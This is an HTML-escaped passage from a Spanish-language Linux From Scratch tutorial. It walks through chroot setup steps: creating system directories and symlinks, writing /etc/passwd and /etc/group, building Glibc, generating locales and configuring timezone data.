&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /var/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;log,mail,spool&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; /run /var/run
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; /run/lock /var/lock
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /var/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;opt,cache,lib/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;color,misc,locate&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,local&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349rN.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;creación-de-archivos-esenciales-y-links-simbólicos&quot;&gt;Creación de archivos esenciales y Links Simbólicos&lt;/h5&gt;

&lt;p&gt;Algunos programas usan rutas “cableadas” a programas que aún no existen. Para satisfacer la accesibilidad de estos programas, crearemos una serie de enlaces simbólicos los cuales serán reemplazados por archivos reales:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; /tools/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;bash,cat,chmod,dd,echo,ln,mkdir,pwd,rm,stty,touch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /bin
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; /tools/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;env&lt;/span&gt;,install,perl,printf&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;         /usr/bin
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; /tools/lib/libgcc_s.so&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,.1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                  /usr/lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; /tools/lib/libstdc++.&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a,so&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,.6&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt;             /usr/lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; bash /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349rQ.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, para satisfacer las utilidades que esperan la presencia de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/mtab&lt;/code&gt;, crearemos otro enlace simbólico:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; /proc/self/mounts /etc/mtab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para que el usuario &lt;strong&gt;root&lt;/strong&gt; pueda iniciar sesión y para que se reconozca el nombre &lt;strong&gt;root&lt;/strong&gt;, deben de haber entradas relevantes en los archivos ‘&lt;em&gt;/etc/passwd&lt;/em&gt;’ y ‘&lt;em&gt;/etc/group&lt;/em&gt;’.&lt;/p&gt;

&lt;p&gt;Crearemos estos archivos de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/passwd &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/dev/null:/bin/false
daemon:x:6:6:Daemon User:/dev/null:/bin/false
messagebus:x:18:18:D-Bus Message Daemon User:/var/run/dbus:/bin/false
nobody:x:99:99:Unprivileged User:/dev/null:/bin/false
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/group &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
root:x:0:
bin:x:1:daemon
sys:x:2:
kmem:x:3:
tape:x:4:
tty:x:5:
daemon:x:6:
floppy:x:7:
disk:x:8:
lp:x:9:
dialout:x:10:
audio:x:11:
video:x:12:
utmp:x:13:
usb:x:14:
cdrom:x:15:
adm:x:16:
messagebus:x:18:
input:x:24:
mail:x:34:
kvm:x:61:
wheel:x:97:
nogroup:x:99:
users:x:999:
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por último, para eliminar la cadena &lt;strong&gt;I have no name!&lt;/strong&gt;, iniciaremos una nueva shell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /tools/bin/bash &lt;span class=&quot;nt&quot;&gt;--login&lt;/span&gt; +h
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Todo este proceso, debería verse de la siguiente forma:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349rP.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Al final de la imagen, lo que he hecho ha sido inicializar los archivos de registro y asignarles los permisos adecuados, serían estos comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /var/log/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;btmp,lastlog,faillog,wtmp&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;chgrp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; utmp /var/log/lastlog
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 664  /var/log/lastlog
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 600  /var/log/btmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;instalación-del-software-básico-del-sistema&quot;&gt;Instalación del Software básico del sistema&lt;/h4&gt;

&lt;p&gt;Comienza una nueva labor de compilación, esta vez en el entorno chroot. Si la anterior nos pareció larga… en esta sí que habrá que armarse de paciencia, porque será el triple de larga.&lt;/p&gt;

&lt;p&gt;Os iré definiendo por cada paquete los comandos que tendréis que ir ejecutando a nivel de sistema. La compilación de estos paquetes si seguís paso a paso los comandos no os deberían de dar error (salvo algún que otro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make check&lt;/code&gt;, pero por lo demás las instalaciones se deberían realizar correctamente).&lt;/p&gt;

&lt;p&gt;Antes de proseguir, deberemos situarnos en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sources&lt;/code&gt;, que es donde se sitúan todos los comprimidos.&lt;/p&gt;

&lt;h5 id=&quot;api-headers-en-lfs&quot;&gt;API Headers en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make mrproper

make headers
find usr/include &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.*'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-delete&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;usr/include/Makefile
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rv&lt;/span&gt; usr/include/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/include
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;man-pages-en-lfs&quot;&gt;Man pages en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;glibc-en-lfs&quot;&gt;Glibc en LFS&lt;/h5&gt;

&lt;p&gt;&lt;strong&gt;AVISO:&lt;/strong&gt; La compilación e instalación de este paquete puede demorar bastante tiempo, así que tendréis que salir un poco a tomar el aire. Asimismo, la fase del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make check&lt;/code&gt; es normal que de algún que otro fallo, pero no hay de qué preocuparse.&lt;/p&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;patch &lt;span class=&quot;nt&quot;&gt;-Np1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ../glibc-2.31-fhs-1.patch

&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
    &lt;/span&gt;i?86&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ld-linux.so.2 /lib/ld-lsb.so.3
    &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
    x86_64&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../lib/ld-linux-x86-64.so.2 /lib64
            &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../lib/ld-linux-x86-64.so.2 /lib64/ld-lsb-x86-64.so.3
    &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd       &lt;/span&gt;build

&lt;span class=&quot;nv&quot;&gt;CC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcc -ffile-prefix-map=/tools=/usr&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
../configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr                          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-werror&lt;/span&gt;                       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-kernel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3.2                    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-stack-protector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;strong        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--with-headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/include            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nv&quot;&gt;libc_cv_slibdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/lib

make

&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
  &lt;/span&gt;i?86&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfnv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;/elf/ld-linux.so.2        /lib &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
  x86_64&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfnv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;/elf/ld-linux-x86-64.so.2 /lib &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

make check

&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /etc/ld.so.conf
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/test-installation/s@$(PERL)@echo not running@'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ../Makefile
make &lt;span class=&quot;nb&quot;&gt;install
cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ../nscd/nscd.conf /etc/nscd.conf
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /var/cache/nscd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Deberíais poder llegar hasta aquí sin problemas:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349xv.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ahora bien, toca instalar las configuraciones regionales. Ejecutaremos estos comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /usr/lib/locale
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; POSIX &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 C.UTF-8 2&amp;gt; /dev/null &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; cs_CZ &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 cs_CZ.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; de_DE &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-1 de_DE
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; de_DE@euro &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-15 de_DE@euro
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; de_DE &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 de_DE.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; el_GR &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-7 el_GR
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; en_GB &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 en_GB.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; en_HK &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-1 en_HK
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; en_PH &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-1 en_PH
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; en_US &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-1 en_US
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; en_US &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 en_US.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; es_MX &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-1 es_MX
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; fa_IR &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 fa_IR
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; fr_FR &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-1 fr_FR
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; fr_FR@euro &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-15 fr_FR@euro
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; fr_FR &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 fr_FR.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; it_IT &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ISO-8859-1 it_IT
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; it_IT &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 it_IT.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ja_JP &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; EUC-JP ja_JP
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ja_JP &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; SHIFT_JIS ja_JP.SIJS 2&amp;gt; /dev/null &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ja_JP &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 ja_JP.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ru_RU &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; KOI8-R ru_RU.KOI8-R
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ru_RU &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 ru_RU.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tr_TR &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; UTF-8 tr_TR.UTF-8
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; zh_CN &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; GB18030 zh_CN.GB18030
localedef &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; zh_HK &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; BIG5-HKSCS zh_HK.BIG5-HKSCS
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y por último, este otro comando, el cual puede llevar bastante tiempo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make localedata/install-locales
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349xN.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, crearemos un nuevo archivo ‘&lt;em&gt;/etc/nsswitch.conf&lt;/em&gt;’ aplicando el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/nsswitch.conf &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/nsswitch.conf

passwd: files
group: files
shadow: files

hosts: files dns
networks: files

protocols: files
services: files
ethers: files
rpc: files

# End /etc/nsswitch.conf
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Este archivo es necesario dado que los valores predeterminados &lt;strong&gt;Glibc&lt;/strong&gt; no funcionan correctamente en un entorno de red.&lt;/p&gt;

&lt;p&gt;Añadiremos los datos relacionados con la zona horaria ejecutando los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; ../../tzdata2019c.tar.gz

&lt;span class=&quot;nv&quot;&gt;ZONEINFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/zoneinfo
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZONEINFO&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;posix,right&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;tz &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;etcetera southamerica northamerica europe africa antarctica  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
          asia australasia backward pacificnew systemv&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;zic &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; /dev/null   &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZONEINFO&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tz&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
    zic &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; /dev/null   &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZONEINFO&lt;/span&gt;/posix &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tz&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
    zic &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; leapseconds &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZONEINFO&lt;/span&gt;/right &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tz&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; zone.tab zone1970.tab iso3166.tab &lt;span class=&quot;nv&quot;&gt;$ZONEINFO&lt;/span&gt;
zic &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZONEINFO&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; America/New_York
&lt;span class=&quot;nb&quot;&gt;unset &lt;/span&gt;ZONEINFO
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya en este punto, ejecutaremos el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tzselect
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En mi caso estoy en Canarias, por tanto seleccionaré las siguientes opciones:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349zC.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez seleccionadas estas opciones, crearemos el siguiente enlace simbólico con el nombre de la zona horaria previamente seleccionada:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; /usr/share/zoneinfo/&amp;lt;xxx&amp;gt; /etc/localtime
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349zH.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por último, configuraremos el cargador dinámico:&lt;/p&gt;

